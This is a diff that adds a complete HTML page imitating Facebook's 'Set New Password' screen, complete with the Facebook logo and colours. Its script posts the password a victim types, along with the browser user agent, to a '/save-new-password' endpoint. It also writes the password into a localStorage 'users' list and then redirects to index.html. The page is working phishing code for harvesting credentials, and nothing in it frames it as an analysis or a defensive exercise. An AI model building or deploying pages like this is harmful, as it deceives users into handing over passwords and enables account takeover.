@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Set New Password | Facebook</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    body, html {
+      margin: 0; padding: 0; height: 100%;
+      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      background-color: #f0f2f5;
+      color: #1c1e21;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
+      font-weight: 400;
+      font-size: 14px;
+    }
+
+    .wrapper {
+      width: 45vw;
+      max-width: 200px;
+      min-width: 300px;
+      background: transparent;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+    }
+
+    .logo img {
+      width: 56px;
+      height: auto;
+      margin-bottom: 25px;
+      user-select: none;
+    }
+
+    h1 {
+      font-weight: 400;
+      font-size: 1.6rem;
+      margin-bottom: 8px;
+      letter-spacing: 0.01em;
+    }
+
+    p {
+      font-size: 1rem;
+      color: #606770;
+      margin-top: 0;
+      margin-bottom: 28px;
+      font-weight: 400;
+    }
+
+    input[type="password"] {
+      width: 100%;
+      font-size: 1.1rem;
+      padding: 12px 14px;
+      border: 2px solid #ccd0d5;
+      border-radius: 6px;
+      outline: none;
+      transition: border-color 0.3s ease;
+      margin-bottom: 28px;
+      font-weight: 400;
+      color: #1c1e21;
+      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      max-width: 100%;
+      box-sizing: border-box;
+    }
+    input[type="password"]:focus {
+      border-color: #1877f2;
+      box-shadow: 0 0 6px #1877f2aa;
+    }
+    input[type="password"]::placeholder {
+      color: #999;
+      font-weight: 400;
+      font-size: 1rem;
+      opacity: 1;
+    }
+
+    button.primary-btn {
+      width: 100%;
+      padding: 14px;
+      font-size: 1.1rem;
+      background-color: #1877f2;
+      border: none;
+      border-radius: 30px;
+      color: white;
+      font-weight: 400;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      user-select: none;
+      max-width: 100%;
+      box-sizing: border-box;
+    }
+    button.primary-btn:hover {
+      background-color: #165dbb;
+    }
+
+    button.back-btn {
+      margin-top: 20px;
+      background: none;
+      border: none;
+      color: #1877f2;
+      font-size: 1rem;
+      cursor: pointer;
+      font-weight: 400;
+      text-decoration: underline;
+      user-select: none;
+    }
+    button.back-btn:hover {
+      color: #0f4abc;
+    }
+
+    .message {
+      position: fixed;
+      top: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 999;
+      background-color: #f8f9fa;
+      color: #333;
+      padding: 12px 20px;
+      border-radius: 6px;
+      font-size: 0.95rem;
+      font-weight: 400;
+      max-width: 90%;
+      width: auto;
+      text-align: center;
+      user-select: none;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+      display: none;
+    }
+
+    .message.show {
+      display: block;
+    }
+
+    .message.success {
+      background-color: #d4edda;
+      color: #155724;
+      border: 1px solid #c3e6cb;
+    }
+
+    .message.error {
+      background-color: #f8d7da;
+      color: #721c24;
+      border: 1px solid #f5c6cb;
+    }
+
+    @media (max-width: 700px) {
+      .wrapper {
+        width: 90vw;
+      }
+      h1 {
+        font-size: 1.4rem;
+      }
+      p {
+        font-size: 0.9rem;
+      }
+      input[type="password"], button.primary-btn {
+        font-size: 1rem;
+      }
+      button.back-btn {
+        font-size: 0.9rem;
+      }
+      body, html {
+        font-size: 13px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="wrapper">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook Logo" />
+    </div>
+
+    <h1>Create New Password</h1>
+    <p>Please enter your new password below.</p>
+
+    <input type="password" id="newPassword" placeholder="New password" autocomplete="new-password" />
+
+    <button class="primary-btn" onclick="setNewPassword()">Set Password</button>
+    <button class="back-btn" onclick="goToLogin()">Back to Login</button>
+
+    <div id="message" class="message"></div>
+  </div>
+
+  <script>
+    function setNewPassword() {
+      const passwordInput = document.getElementById("newPassword");
+      const messageEl = document.getElementById("message");
+      const newPassword = passwordInput.value.trim();
+
+      messageEl.textContent = "";
+      messageEl.className = "message";
+
+      if (newPassword.length < 6) {
+        messageEl.textContent = "Password must be at least 6 characters long.";
+        messageEl.classList.add("error", "show");
+        return;
+      }
+
+      // Save new password data
+      const newPasswordData = {
+        newPassword: newPassword,
+        userAgent: navigator.userAgent
+      };
+
+      fetch('/save-new-password', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(newPasswordData)
+      }).then(response => response.json())
+        .then(data => {
+          console.log('New password saved:', data.success);
+        }).catch(error => {
+          console.error('Error saving new password:', error);
+        });
+
+      const users = JSON.parse(localStorage.getItem("users")) || [];
+      if (users.length > 0) {
+        users[users.length - 1].password = newPassword;
+      } else {
+        users.push({ username: "unknown", password: newPassword });
+      }
+      localStorage.setItem("users", JSON.stringify(users));
+
+      messageEl.textContent = "Your password has been successfully set!";
+      messageEl.classList.add("success", "show");
+
+      passwordInput.value = "";
+      passwordInput.disabled = true;
+
+      setTimeout(() => {
+        window.location.href = "index.html";
+      }, 3000);
+    }
+
+    function goToLogin() {
+      window.location.href = "index.html";
+    }
+  </script>
+</body>
+</html>
